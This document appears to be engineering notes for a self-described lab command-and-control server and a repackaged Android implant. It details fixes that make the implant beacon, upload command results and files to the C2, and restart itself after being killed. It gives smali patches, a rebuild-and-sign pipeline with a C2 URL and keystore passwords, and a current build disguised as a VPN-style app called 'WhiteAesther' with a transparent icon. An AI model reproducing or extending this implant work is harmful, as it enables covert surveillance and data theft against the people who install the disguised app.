# VexR lab C2 — root causes and architecture

Everything here was proven from the built DEX, the live server logs, or a
failing request reproduced locally. Nothing is inferred from the source alone.

---

## Part 1 — Why the phone never appeared (solved)

### Symptom

```
warn | unauthorized beacon rejected from 100.64.0.11
```

### Cause

The installed build resolved its token through `NativeSecurity.getAuthToken()`,
whose native branch returns the offensive token. The DEX fallback was already
patched, but `isLoaded` was true because the running APK still had the original
`loadNativeLibrary()`.

| fingerprint | value |
|---|---|
| `len=26 sha256=82baed93…` | `VexR_Auth_99x_2026_Secured` — what the phone sent |
| `len=28 sha256=2958fa5b…` | `VexR_Lab_Academic_Token_2026` — what the server expected |

### Fix

`analysis/harden_native.py` rewrites the three `NativeSecurity` getters to call
`InternalResolver` unconditionally, removing the native branch entirely.

---

## Part 2 — Why `KeyError('k')` appeared (solved)

### Symptom

```
error | decrypt failed: 'k' | keys=[d,i,v] body_len=17 k_len=0
```

### Cause

`sp0.d` calls `SecurityRuntime.decode(sp0.g.getValue())`, i.e. `ky(5)`, then
hands the result to `wg1.a()` as a Base64 X.509 key. The lab patch had `ky(5)`
return raw DER bytes, so `decode()` XORed the DER with `VexR_2026` and produced
non-ASCII garbage. `wg1.a()` threw, returned null, and `sp0.e` emitted `&k=`
with no value.

### Fix — and a second bug found underneath it

`analysis/fix_pubkey2.py` makes `ky(5)` read the XOR-encoded key from
`assets/lab_pubkey.bin`.

The first attempt embedded the key as a smali `const-string` of `\uXXXX`
escapes. That **silently corrupted the key**: the XOR output contains `0x00` at
indices 123, 208 and 305 of its 392 bytes, and apktool's assembler mangles
`\u0000`. The built DEX held a corrupted 123-byte prefix, so the RSA key never
loaded. Verified by reading the string straight out of `classes.dex`:

```
[*] first 123 bytes found at dex offset 202
[*] bytes following in dex: c080600f3f2b...
[*] wanted next 40 bytes : 00600f3f2b57...
```

Binary assets round-trip byte-for-byte, NULs included, so the key ships as an
asset instead.

---

## Part 3 — Why commands returned nothing (solved)

### Symptom

A command was queued, the phone received it, and no result ever appeared. The
`Files received` counter stayed at zero.

### Cause — the important one

The implant has **two** uplink paths and they encrypt differently:

| method | endpoint | body |
|---|---|---|
| `sp0.e()` | `/panel.php` | `v=3&d=&k=&i=` envelope |
| `sp0.f()` | `/file.php` | **the raw file bytes, unencrypted** |

`sp0.f()` is what every command result uses:

```smali
new-instance v1, La/ql0;              # RequestBody.create(mediaType, file)
invoke-direct {v1, v0, p1}, ...
invoke-virtual {p1, p0, v1}, La/s2;->o(...)   # POST
```

No `wg1.a()`, no `wg1.b()`, no envelope. The old `/file.php` handler called
`crypto.decrypt()` unconditionally, threw `KeyError('k')`, and discarded the
body. Reproduced exactly:

```
$ curl -X POST '/file.php?p=EeILBT' -d 'TEST CONTENT'
{"status":"error"}
error | file decrypt failed: 'k'
```

There is a second, related trap in `sp0.e()`. When either crypto step returns
null it jumps to `:cond_6` and **posts the plaintext form anyway**:

```smali
:cond_5
if-eqz v8, :cond_6      # wg1.b() returned null -> skip the envelope
if-eqz v4, :cond_6      # wg1.a() returned null -> skip the envelope
...
:cond_6
... POST p0 ...          # p0 is still the raw form
```

That is the `action=heartbeat&Model=M…` body seen in production. It is not a
bug in the server; it is the implant degrading gracefully.

### Fix

`protocol.py` classifies every uplink body into one of three transports
(`encrypted`, `plain-form`, `raw-file`) before any handler touches it.
`/file.php` stores raw bytes as artifacts instead of trying to decrypt them.

---

## Part 4 — Production issues found during the refactor

### 4a. No persistent volume — every redeploy wiped the data

`railway volume list` returned `No volumes found`. The container filesystem is
ephemeral, so each deploy discarded `vexr_lab.db` and every artifact. Confirmed
when the refactor went live and `devices` went from 1 to 0.

Fixed by attaching a volume at `/data` and having `store.py` prefer it:

```
C2 started · db=/data/vexr_lab.db artifacts=/data/artifacts persistent=True
```

### 4b. `railway up` timed out uploading APKs

15.8 MB of implant binaries sat beside the server and were uploaded on every
deploy, which is what made `railway up` fail with `operation timed out` and
`error decoding response body`. `.railwayignore` now excludes them.

### 4c. Schema migration

The live database predates the refactor. `store.init_db()` adds the new columns
in place and carries the old `files` table into `artifacts`, so no evidence is
lost. It runs on every boot and is idempotent.

---

## Part 5 — Why the phone flipped to offline (diagnosed; server side fixed)

### Symptom

The handset is supposed to beacon every few seconds. After a few minutes the
dashboard showed it offline and no further traffic arrived.

### What the beacon log actually says

From the production database (`/api/beacons`, `/api/log`), 2026-11-18 UTC:

| window | behaviour |
|---|---|
| 02:06:39 → 02:35:26 | 58 heartbeats, median gap **30.29 s** |
| 02:35:26 → 02:37:41 | 135 s silence, then `install` and the startup burst |
| 02:38:42 → 02:41:59 | **197 s** silence, then a heartbeat carrying three queued commands |
| 02:42:16 → end of data | nothing at all |

The loop itself is healthy: 29 minutes of 30-second beats, across a server
redeploy at 02:34:49. The failures are the gaps where the service was not
running.

### Three numbers that did not agree

| value | where |
|---|---|
| 30 000 ms | `HeartbeatService$startHeartbeatLoop$1` delay |
| 180 000 ms | `KeepAliveReceiver.ALARM_INTERVAL_MS` |
| 120 s | `store.ONLINE_WINDOW_SECONDS` |

`120 < 180`. The dashboard therefore declared the phone offline for the last
77 s of the 197 s gap even though the phone was behaving as designed. The
liveness window has to cover the slowest keep-alive cadence, not the fastest
one.

**Fixed:** `ONLINE_WINDOW_SECONDS = 240`, plus a regression test that fails if
it drops below the alarm interval again. The dashboard now states both
cadences instead of promising 30 s for everything.

### Client-side fix — `KeepAliveReceiver` alarm was never scheduled

Root cause confirmed from the built DEX:

| problem | evidence |
|---|---|
| `targetSdkVersion=34` (≥ 31) | `AndroidManifest.xml` line 12 |
| `setExactAndAllowWhileIdle` used without permission | `KeepAliveReceiver$Companion.smali` line 124 |
| `SCHEDULE_EXACT_ALARM` missing from manifest | grep = 0 matches in all builds |
| exception swallowed, no fallback | `catch Ljava/lang/Exception;` → log + `return-void` |

On API 31+, `setExactAndAllowWhileIdle` throws `SecurityException` unless the
app declares `SCHEDULE_EXACT_ALARM`. The sample didn't declare it, so the
`catch` logged `Failed to schedule alarm` and returned — the 3-minute alarm was
never created, and nothing ever restarted the process after a kill.

**Fix applied in `D_Kyt7_lab_hardened_fixed.apk`:**

1. `AndroidManifest.xml` — added:

   ```xml
   <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
   ```

2. `KeepAliveReceiver$Companion.scheduleNextAlarm` — catch the
   `SecurityException` and fall back to an inexact `AlarmManager.set()` instead
   of silently giving up. The two `AlarmManager` calls live in their own tiny
   static methods so no exception handler ever touches a register whose
   verified type depends on the try block:

   ```smali
   .method private static setExactAlarm(Landroid/app/AlarmManager;JLandroid/app/PendingIntent;)V
       .locals 3
       const/4 v0, 0x0
       invoke-virtual {p0, v0, p1, p2, p3}, Landroid/app/AlarmManager;->setExactAndAllowWhileIdle(IJLandroid/app/PendingIntent;)V
       return-void
   .end method

   # ... same shape for setInexactAlarm -> AlarmManager->set(IJLandroid/app/PendingIntent;)V

   # scheduleNextAlarm:
   :try_start_0
       invoke-static {v0, v3, v4, v5}, ...->setExactAlarm(Landroid/app/AlarmManager;JLandroid/app/PendingIntent;)V
   :try_end_0
   .catch Ljava/lang/SecurityException; {:try_start_0 .. :try_end_0} :catch_sec
   .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_gen

   :catch_sec
       move-exception v6
       invoke-static {v0, v3, v4, v5}, ...->setInexactAlarm(Landroid/app/AlarmManager;JLandroid/app/PendingIntent;)V
   ```

The exact alarm is tried first; only if the permission grant fails (or on older
devices where `setExactAndAllowWhileIdle` isn't available) does it degrade to
an inexact alarm. The alarm still fires roughly every 3 minutes and restarts
`HeartbeatService`, which resumes the 30-second heartbeat loop.

### Regression caught on device — the first patch crashed the app at launch

The first version of the patch called `AlarmManager->set(...)` from inside the
`catch` block using the same register that held the result of `getSystemService`
and the `check-cast`. At the handler entry the verifier merges that register
across every throwing instruction of the try block, so its type becomes
`Object` instead of `AlarmManager`. Calling an `AlarmManager` method on it is a
verification failure: ART throws `VerifyError` when the method runs.

`KeepAliveReceiver$Companion.scheduleNextAlarm` runs during startup — a
coroutine created in `MainApplication` (`a/d90`) starts `HeartbeatService` and
schedules the first alarm — and the only guard around that call site is
`catch (Exception)`, which does not catch `VerifyError`. Result: install the
APK, tap the icon, the process dies before the permission screen ever appears.

Fix: the `AlarmManager` reference is never reused from a register that the
verifier has merged. Each alarm call gets a straight-line static helper, and the
catch block re-fetches the system service into a fresh register. Verified by
decompiling the rebuilt DEX (`jadx`): the method now reads as a plain nested
`try/catch` with `setExactAlarm` / `setInexactAlarm` calls, and every register
used in a handler (`v3/v4` the trigger time, `v5` the `PendingIntent`, `v7` the
log tag) is assigned before the `try` and never rewritten inside it.

Verify on the handset after installing the fixed build:

```
adb logcat -d -s KeepAliveReceiver HeartbeatService AndroidRuntime
```

Expected on the fixed build:
- `Next keep-alive alarm scheduled in 3 minutes (exact)` — when permission granted
- OR `Next keep-alive alarm scheduled in 3 minutes (inexact fallback)` — if permission not granted
- `Alarm triggered - verifying HeartbeatService status` — repeats every ~3 minutes
- NOT `Failed to schedule alarm`

What remains outside this lab's scope: exact alarm access is still subject to
Doze, App Standby buckets, and OEM killers (MIUI). The fallback keeps the
recovery path alive, but a guarantee of "always reachable" requires the user to
whitelist the app from battery optimization — an OS policy decision, not a code
defect.

---

## Architecture

```
server.py     HTTP routes, operator API
protocol.py   crypto, body classification (the three transports)
store.py      SQLite schema, migrations, artifacts on disk, read models
dashboard.py  operator UI
test_protocol.py  conformance tests (27 checks)
```

### Uplink contract

| transport | endpoint | auth | storage |
|---|---|---|---|
| `encrypted` | `/panel.php` | `X-Auth-Token` | `beacons` |
| `plain-form` | `/panel.php` | `X-Auth-Token` | `beacons` |
| `raw-file` | `/file.php` | `X-Auth-Token` | `artifacts` + file on disk |

### Command lifecycle

```
queue_command()  -> pending
next beacon      -> sent      (claim_pending_commands)
artifact upload  -> completed (+ artifact_id)
no upload in 15m -> expired
```

The dashboard polls `/api/stats`, which runs the expiry sweep, so a command that
was delivered but never answered stops showing as `sent`.

---

## Rebuilding the APK

```bash
/home/arsham/bin/apktool d -f -o /tmp/build/dec D_Kyt7_lab.apk
python3 -I analysis/harden_native.py   /tmp/build/dec
python3 -I analysis/reencode_config.py /tmp/build/dec \
    "VexR_Lab_Academic_Token_2026" \
    "https://vexr-lab-c2-academic-production.up.railway.app"
python3 -I analysis/fix_pubkey2.py     /tmp/build/dec
/home/arsham/bin/apktool b /tmp/build/dec -o /tmp/build/out.apk
java -jar /home/arsham/bin/uber-apk-signer.jar --apks /tmp/build/out.apk \
    --ks lab_keystore.jks --ksAlias labkey \
    --ksPass labpass123 --ksKeyPass labpass123 --allowResign --overwrite
```

Signing certificate: `647fc7dd10997829a140f3a14ed60bd5593f3253766c0b521da7bb5bd575c26e`

Fixed client build: `D_Kyt7_lab_hardened_fixed.apk` (sha256
`c0017b0f175e84c4d9d3271b1a5ecf43fecb66b2145f3440004da9d821e3d277`)
— adds `SCHEDULE_EXACT_ALARM` permission and an inexact-alarm fallback in
`KeepAliveReceiver$Companion.scheduleNextAlarm`. **Superseded**: it contains the
verify-unsafe catch block described above and crashes on launch.

Current client build: `WhiteAesther.apk` (sha256
`5d1f3ca67dbfb6e7fafd0d7d095da8305ebebdd5c108011ab749cc1f02b362ba`)
— same package `com.VexR.app`, versionCode 3 / versionName 3.4.1, signed with
the same key, so it installs over any earlier build. Adds the alarm fix in its
corrected form, renames the app to `WhiteAesther` with a transparent circular
icon, and replaces the WebView registration page with a local app screen.

### Local frontend

`vpn_frontend/index.html` is the source of the UI that ships as
`assets/index.html`. `setupWebView` hard-sets

```smali
const-string v1, "file:///android_asset/index.html"
```

right after the `:goto_0` merge point and before `loadUrl`, so the encrypted
`web_key` URL from the config can never override it. The page is one
self-contained file: Persian RTL, dark/aqua theme, bundled Vazirmatn
(`woff2` embedded as base64) so it renders identically offline. `a/y80`
already permits `file://`, and `setDomStorageEnabled(true)` was already in
`setupWebView`, so `localStorage` works for the UI's persisted choices.

---

## Reference: fingerprints

```bash
python3 -c "import hashlib;print(hashlib.sha256(b'VexR_Auth_99x_2026_Secured').hexdigest()[:16])"
# 82baed93521f627c   <- offensive / native
python3 -c "import hashlib;print(hashlib.sha256(b'VexR_Lab_Academic_Token_2026').hexdigest()[:16])"
# 2958fa5b58d68a01   <- academic / expected
```
